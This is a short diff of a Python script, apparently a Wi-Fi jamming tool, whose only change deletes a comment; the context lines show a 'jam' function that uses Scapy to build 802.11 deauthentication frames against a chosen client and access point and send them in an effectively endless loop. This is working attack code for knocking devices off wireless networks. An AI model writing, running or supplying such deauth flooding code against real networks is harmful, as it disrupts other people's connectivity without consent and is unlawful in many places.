@@ -32,7 +32,7 @@ def network_scan():
     return bssid
 
 def jam(address, card, client):
-	conf.verb = 0  # shut up Scapy
+	conf.verb = 0  
 	packet = RadioTap()/Dot11(addr1=client,addr2=address,addr3=address)/Dot11Deauth()
 	print("Jamming network: " + address)
 	sendp(packet, iface = card, count=10000000000, inter=0.001, loop=1) #Send deauth packet
